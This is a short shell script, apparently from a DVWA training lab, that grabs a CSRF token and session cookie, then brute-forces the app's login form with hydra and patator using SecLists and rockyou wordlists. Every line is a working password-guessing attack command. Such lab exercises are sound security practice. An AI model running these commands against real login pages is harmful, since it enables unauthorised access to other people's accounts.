CSRF=$(curl -s -c dvwa.cookie "localhost/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7)
curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "192.168.1.44/DVWA/login.php" >/dev/null

hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt \
  -e ns  -F  -u  -t 4  -w 15  -v  -V  192.168.1.44  http-get-form \
  "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=medium; PHPSESSID=${SESSIONID}"

patator  http_fuzz  method=GET  follow=0  accept_cookie=0  --threads=4  timeout=15  --max-retries=0 \
  url="http://192.168.1.44/DVWA/vulnerabilities/brute/?username=FILE1&password=FILE0&Login=Login" \
  1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/rockyou-40.txt \
  header="Cookie: security=medium; PHPSESSID=${SESSIONID}" \
  -x quit:fgrep='Welcome to the password protected area'
